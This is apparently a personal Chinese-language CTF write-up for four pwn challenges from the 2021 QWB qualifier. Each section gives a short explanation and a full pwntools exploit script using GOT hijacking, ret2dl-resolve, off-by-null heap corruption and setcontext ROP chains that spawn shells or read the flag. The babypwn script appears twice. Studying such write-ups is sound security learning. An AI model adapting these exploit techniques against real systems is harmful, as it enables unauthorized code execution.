
---
title:  2021qwb-pwn-初赛-wp
categories: [CTF]
tags: [wp,pwn]
date: 2021-6-26 10:22:38
---
tcl,逆向能力薄弱的我被qwb打傻了.赛后复现时,发现好多题思路是对的.卡在了逆向反推上面.但反过来,在赛后看了很多大牛的博客后,也学习到很多知识,想这段时间忙完后单独写几篇来坐坐笔记。<!--more-->

## ORW

这道题在创建chunk时，存在有数组越界导致我们可以劫持got表，从而劫持了exit那些函数。再通过整数溢出扩大shell_code写入的范围。同时，由于execve导致我们只能通过orw（open read write）的方法读flag。

```python
from pwn import *
context(arch = 'amd64', os = 'linux')

e=ELF('./pwn2')

p=remote('39.105.131.68',12354)
#process('./pwn2')


def add(num,size,text):
    p.sendline('1')
    p.recvuntil('index')
    p.sendline(str(num))
    p.recvuntil('size')
    p.sendline(str(size))
    #p.recvuntil('content')
    p.sendline(text)
def free(num):
    p.sendline('4')
    #p.recvuntil('index')
    p.sendline(str(num))


add(-13,0xffffffff+1,asm('''
 mov rsi, [r13+8];
 mov rdx, 0x8;
 mov rdi, 0x0;
 mov r10, 0x0;
 mov rax, 0x0;
 syscall;

 mov rsi, [r13+8];
 mov rdx, 0x8;
 mov rdi, 0x1;
 mov r10, 0x0;
 mov rax, 0x1;
 syscall;
 
 mov rdi, [r13+8];
 mov rdx, 0x0;
 mov rsi, 0x60;
 mov r10, 0x0;
 mov rax, 0x2;
 syscall;
 
 mov rsi, [r13+8];
 mov rdx, 0x68;
 mov rdi, 0x3;
 mov r10, 0x0;
 mov rax, 0x0;
 syscall;
 mov rsi, [r13+8];
 mov rdx, 0x68;
 mov rdi, 0x1;
 mov r10, 0x0;
 mov rax, 0x1;
 syscall;
 
 '''))
#free(-6)
#add(1,7,'w'*0x7)
print('x_x')
#free(-13)


#gdb.attach(p)
print('x_x')
p.sendline('5')
print('x_x')
p.sendline('/flag\x00')
free(-6)
p.interactive()
```

## no_output

题目有的阴间，ban了标准输出而且我IDA F5的代码又有问题识别不了libc函数（太菜了）。导致只能慢慢手撕汇编和动态gdb。通过合理覆盖，让 `read(3,xx,xx)`变为`read(0,xx,xx)`写入‘hello_boy\x00’绕过cmp。

再通过'-0x80000000/-1==0'的特性触发signal，进入栈溢出的read，ret2dl-resolve get shall.

```python
from pwn import *
from pwnlib.util.iters import mbruteforce

e=ELF('./test')


#p=remote('39.105.138.97',1234)
p=process('./test')

p.send('\x00\x00\n')
sleep(1)
#gdb.attach(p)
p.send('w'*(0x30-16)+'hello_boy\x00\n')
p.sendline('x'*0x5)


p.sendline(str(-0x80000000))
p.sendline(str(-1))
rop = ROP('./test')
dlresolve = Ret2dlresolvePayload(e, symbol="system", args=["/bin/sh"]) 
rop.read(0, dlresolve.data_addr) 
rop.ret2dlresolve(dlresolve) 
raw_rop = rop.chain() 
print(rop.dump())
print(hex(dlresolve.data_addr))

p.sendline('x'*(0x50-4)+raw_rop)
sleep(2)
p.sendline(dlresolve.payload)

p.interactive()
```

## baby_diary

典型的高版本all-off-null,不同的是在我们在对面chunk写入信息后,会根据我们的写入,计算一个半字节并放入我们输入信息后.当我们出入全是'\x00',那个半字节就是'\x0',若不是'\x00则是非'\x0'的办字节.因此我们在输入时,至少影响一个半的字节.因此我们只能通过爆破法来求解.

```python
#!/usr/bin/env python
# coding=utf-8
from pwn import *
import libcfind
#sh=process('./baby_diary')
#sh=remote('8.140.114.72', 1399)
elf=ELF('./baby_diary')
#libc=ELF('./libc-2.31.so')
context.arch="amd64"


def add(size, content='/bin/sh\x00'):
    sh.recvuntil(">> ")
    sh.sendline("1")
    sh.recvuntil("size: ")
    sh.sendline(str(size))
    sh.recvuntil("content: ")
    sh.sendline(content)

def show(idx):
    sh.recvuntil(">> ")
    sh.sendline("2")
    sh.recvuntil("index: ")
    sh.sendline(str(idx))

def free(idx):
    sh.recvuntil(">> ")
    sh.sendline("3")
    sh.recvuntil("index: ")
    sh.sendline(str(idx))


def pwn2():
    for i in range(7):
        add(0x30)

    add(0x4ba0)#7
    add(0x600)#8

    add(0x20)#9
    free(8)


    add(0x37)#8
    add(0x37)#10 x
    add(0x37)#11 x
    add(0x47)#12 x

    for i in range(7):
        free(i)

    free(11)
    free(10)
    add(0x20)#0
    
    add(0x1000,'l chunk')#2


    add(0x440,p8(0))#1
    add(0x1000,'l chunk')#3


    for i in range(7): #4,5,6,10, 11,13,14
        add(0x30)


    add(0x37,p64(0)+p8(0x10)) #15  x
    add(0x37,'5555555')#16 x

    free(16)
    free(8)

    add(0x37,p64(0x190)+p64(0x101)+p8(0x40))#
    add(0x37,p64(0)*6+p8(0)*6)#16
    free(4)
    free(5)
    free(6)
    free(10)
    free(11)
    free(13)
    free(14)
    free(16)
    free(8)

    for i in range(7):
        add(0x30)
    add(0x37,p8(0x10))
    add(0x37,p8(0x10))

    free(12)
    add(0x47,p64(0)*8+p8(0)*7)
    free(12)
    add(0x47,p64(0)*7+p64(0x10))

    for i in range(7): #17+23
        add(0x20)

    free(17)
    free(18)
    free(19)
    free(20)
    free(21)
    free(22)
    free(23)
    free(0)
    add(0x1000)#0
    #gdb.attach(sh)
    add(0x57,'1'*7)#17
#    free(14)
#    add(0x37,p64(1)+p8(0)*8)
    free(14)
    add(0x37,'11122223'+p32(0x61)+p8(0)*4+p8(1)*7)
    free(14)
    add(0x37,'11122223'+p32(0x61)+p8(0)*4+p8(1)*6)
    free(14)
    add(0x37,'11122223'+p32(0x61)+p8(0)*4+p8(1)*5)
    free(14)
    add(0x37,'11122223'+p32(0x61)+p8(0)*4+p8(1)*4)
    free(14)
    add(0x37,'11122223'+p32(0x61)+p8(0)*4+p8(1)*3)
    free(14)
    add(0x37,'11122223'+p32(0x61)+p8(0)*4+p8(1)*2)
    free(14)
    add(0x37,'11122223'+p32(0x61)+p8(0)*4+p8(1)*1)
    free(14)
    add(0x37,'11122223'+p32(0x61)+p8(0)*4)                     
    free(14)
    add(0x37,'11122223'+p32(0x61)+p8(0)*3)    
    show(17)
    addr=u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-391
    log.info('main_arena:'+hex(addr))
    malloc=addr-0x10
    log.info('malloc_hook:'+hex(malloc))
    x=libcfind.finder('__malloc_hook',malloc+10,num=5)

    """
multi libc results:
[-] 0: libc6_2.15-0ubuntu10.23_amd64(source from:ubuntu-eglibc)
[-] 1: libc6-amd64_2.30-0ubuntu2.2_i386(source from:ubuntu-old-glibc)
[-] 2: libc6_2.30-0ubuntu2_amd64(source from:ubuntu-old-glibc)
[-] 3: libc6-amd64_2.31-0ubuntu9.2_i386(source from:ubuntu-glibc)
[-] 4: libc6_2.31-0ubuntu9_amd64(source from:ubuntu-glibc)
[-] 5: local-ad9f264101ca975f82b40fffd5aa6f763cfd1ed9(source from:/usr/lib/x86_64-linux-gnu/libc-2.31.so)
[-] 6: libc6-amd64_2.30-0ubuntu2_i386(source from:ubuntu-old-glibc)
[-] 7: libc6-amd64_2.31-0ubuntu9_i386(source from:ubuntu-glibc)
[-] 8: libc6_2.31-0ubuntu9.2_amd64(source from:ubuntu-glibc)
[-] 9: libc6_2.30-0ubuntu2.2_amd64(source from:ubuntu-old-glibc)
[!] you can choose it by hand
    """
    add(0x57,'22222')
    free(18)
    free(17)
    free(14)
    add(0x37,'11122223'+p32(0x61)+p8(0)*4+p64(x.dump('__free_hook')))#14
    add(0x57)#17
    add(0x57,p64(x.dump('system'))) #18
    free(0)




if __name__ == "__main__":
    
    while True:
        sh=process("./baby_diary")
        #sh=remote('8.140.114.72', 1399)
        try:
            pwn2()
            gdb.attach(sh)
            sh.interactive()
        except Exception, e:
            print(repr(e))
            sh.close()

```



```python
import libcfind
from pwn import *
from z3 import *

e=ELF('./babypwn')
p=process('./babypwn')
context.arch = "amd64"


def add(size):
    p.recvuntil('>>>')
    p.sendline('1')
    p.recvuntil('size')
    p.sendline(str(size))

def free(num):
    p.recvuntil('>>>')
    p.sendline('2')
    p.recvuntil('index:')
    p.sendline(str(num))


def edit(num,text=''):
    p.recvuntil('>>>')
    p.sendline('3')
    p.recvuntil('index:')
    p.sendline(str(num))
    p.recvuntil('content:')
    p.sendline(str(text))

def show(num):
    p.recvuntil('>>>')
    p.sendline('4')
    p.recvuntil('index:')
    p.sendline(str(num))

def decode(v2):
    s=Solver()
    a1=BitVec('a1',32) 
    t = a1
    for i in range(2):
            a1 ^= (32 * a1) ^ (LShR((a1 ^ (32 * a1)), 17)) ^ (((32 * a1) ^ a1 ^ (LShR((a1 ^ (32 * a1)), 17))) << 13)
    s.add(a1 == int(v2,16))
    s.check()
    ans = int(s.model()[t].as_long())
    print(hex(ans))
    return p32(ans)


for i in range(7):
    add(0x100)
add(0xf0)#7
add(0x88)#8
add(0x100)#9
add(0x100)#10
for i in range(7):
    free(i)
edit(9,0xf0*'1'+p64(0x100)+p64(0x11))
free(9)
edit(8,0x88*'1')
add(0x80)#0
p.recv()
show(0)
p.recvline()
x=p.recvline()
y=p.recvline()
x=decode(x)
y=x+decode(y)
addr=u64(y)
log.info(hex(addr))
main_arena=addr-328
malloc=main_arena-0x10
log,info('malloc:'+hex(malloc))
x=libcfind.finder('__malloc_hook',malloc,num=4)

add(0x40)#1
#free(1)
edit(1,'yyyyyyy')
for i in range(8):
    add(0x80)
free(2)
free(3)
free(4)
free(5)
free(6)
free(9)
free(11)
free(0)
free(10)
for i in range(7):
    add(0x80)

add(0x80)#10
add(0x40)#11
add(0x40)#13
free(13)
free(11)
edit(1,p64(x.dump('__free_hook')))
add(0x48)
rdi_ret=x.libcbase+0x0000000000025a3b
rsi_ret=x.libcbase+0x00000000000263e9
rdx_ret=x.libcbase+0x00000000001018c5
rbp_ret=x.libcbase+0x000000000004a1a7
rax=x.libcbase+0x000000000002606c

add(0x48)#13
add(0x100)
show(6)
p.recvline()
xx=p.recvline()
y=p.recvline()
xx=decode(xx)
y=xx+decode(y)
addr=u64(y)
log.info(hex(addr))
edit(13,p64(x.dump('setcontext')+53))
pay=p64(rdi_ret)+p64(0)+p64(rsi_ret)+p64(addr)+p64(rdx_ret)+p64(0x40)+p64(x.dump('read'))
pay+=p64(rdi_ret)+p64(addr)+p64(rsi_ret)+p64(0)+p64(rdx_ret)+p64(0)+p64(x.dump('open'))#open(addr,0,0)
pay+=p64(rdi_ret)+p64(3)+p64(rsi_ret)+p64(addr)+p64(rdx_ret)+p64(0x40)+p64(x.dump('read'))
pay+=p64(rdi_ret)+p64(1)+p64(rsi_ret)+p64(addr)+p64(rdx_ret)+p64(0x40)+p64(x.dump('write'))
print(len(pay))
add(0x200)
edit(15,pay)

edit(3,'1'*0x10+p64(addr+0x118+0x360)+p64(rdi_ret)+'1'*0x18+'3'*0x40+'22222')

gdb.attach(p)
free(4)
sleep(1)

p.sendline('/flag.txt\x00')
#free(10)
#edit(10,'xxxxxxx')

#gdb.attach(p)
p.interactive()

```

## babypwn

heap题orw 第一次做，在正式比赛时踩了很多坑。赛后才复现出来

典型的all by one ，缩小free chunk 用法。但在正式比赛时，直接给自己玩坑chunk 在布局时给小了,导致后面orw 写不下，orz....好在通过z3来爆破出show函数的输出值,可以推算出chunk间的关系。不过，在复现时也学到一个知识：就算我们通过hook控制的只能是程序的rip。不能直接控制rbp和rsp。但我们可以通过SROP方法，利用setcontext来间接控制rbp和rsp。（这里有个坑，布置X64的sigcontext至少需0xf8的空间）同时c语言在执行一些函数时，传入参数格式正确但值不符合逻辑的如read(0,0,0)这种，利用chunk内原本的‘\x00’这样可以适当减少自己写入sigcontext 长度，只需要专注控制rbp和rsp。

```python
import libcfind
from pwn import *
from z3 import *

e=ELF('./babypwn')
p=process('./babypwn')
context.arch = "amd64"


def add(size):
    p.recvuntil('>>>')
    p.sendline('1')
    p.recvuntil('size')
    p.sendline(str(size))

def free(num):
    p.recvuntil('>>>')
    p.sendline('2')
    p.recvuntil('index:')
    p.sendline(str(num))


def edit(num,text=''):
    p.recvuntil('>>>')
    p.sendline('3')
    p.recvuntil('index:')
    p.sendline(str(num))
    p.recvuntil('content:')
    p.sendline(str(text))

def show(num):
    p.recvuntil('>>>')
    p.sendline('4')
    p.recvuntil('index:')
    p.sendline(str(num))

def decode(v2):
    s=Solver()
    a1=BitVec('a1',32) 
    t = a1
    for i in range(2):
            a1 ^= (32 * a1) ^ (LShR((a1 ^ (32 * a1)), 17)) ^ (((32 * a1) ^ a1 ^ (LShR((a1 ^ (32 * a1)), 17))) << 13)
    s.add(a1 == int(v2,16))
    s.check()
    ans = int(s.model()[t].as_long())
    print(hex(ans))
    return p32(ans)


for i in range(7):
    add(0x100)
add(0xf0)#7
add(0x88)#8
add(0x100)#9
add(0x100)#10
for i in range(7):
    free(i)
edit(9,0xf0*'1'+p64(0x100)+p64(0x11))
free(9)
edit(8,0x88*'1')
add(0x80)#0
p.recv()
show(0)
p.recvline()
x=p.recvline()
y=p.recvline()
x=decode(x)
y=x+decode(y)
addr=u64(y)
log.info(hex(addr))
main_arena=addr-328
malloc=main_arena-0x10
log,info('malloc:'+hex(malloc))
x=libcfind.finder('__malloc_hook',malloc,num=4)

add(0x40)#1
#free(1)
edit(1,'yyyyyyy')
for i in range(8):
    add(0x80)
free(2)
free(3)
free(4)
free(5)
free(6)
free(9)
free(11)
free(0)
free(10)
for i in range(7):
    add(0x80)

add(0x80)#10
add(0x40)#11
add(0x40)#13
free(13)
free(11)
edit(1,p64(x.dump('__free_hook')))
add(0x48)
rdi_ret=x.libcbase+0x0000000000025a3b
rsi_ret=x.libcbase+0x00000000000263e9
rdx_ret=x.libcbase+0x00000000001018c5
rbp_ret=x.libcbase+0x000000000004a1a7
rax=x.libcbase+0x000000000002606c

add(0x48)#13
add(0x100)
show(6)
p.recvline()
xx=p.recvline()
y=p.recvline()
xx=decode(xx)
y=xx+decode(y)
addr=u64(y)
log.info(hex(addr))
edit(13,p64(x.dump('setcontext')+53))
pay=p64(rdi_ret)+p64(0)+p64(rsi_ret)+p64(addr)+p64(rdx_ret)+p64(0x40)+p64(x.dump('read'))
pay+=p64(rdi_ret)+p64(addr)+p64(rsi_ret)+p64(0)+p64(rdx_ret)+p64(0)+p64(x.dump('open'))#open(addr,0,0)
pay+=p64(rdi_ret)+p64(3)+p64(rsi_ret)+p64(addr)+p64(rdx_ret)+p64(0x40)+p64(x.dump('read'))
pay+=p64(rdi_ret)+p64(1)+p64(rsi_ret)+p64(addr)+p64(rdx_ret)+p64(0x40)+p64(x.dump('write'))
print(len(pay))
add(0x200)
edit(15,pay)

edit(3,'1'*0x10+p64(addr+0x118+0x360)+p64(rdi_ret)+'1'*0x18+'3'*0x40+'22222')

gdb.attach(p)
free(4)
sleep(1)

p.sendline('/flag.txt\x00')
#free(10)
#edit(10,'xxxxxxx')

#gdb.attach(p)
p.interactive()

```

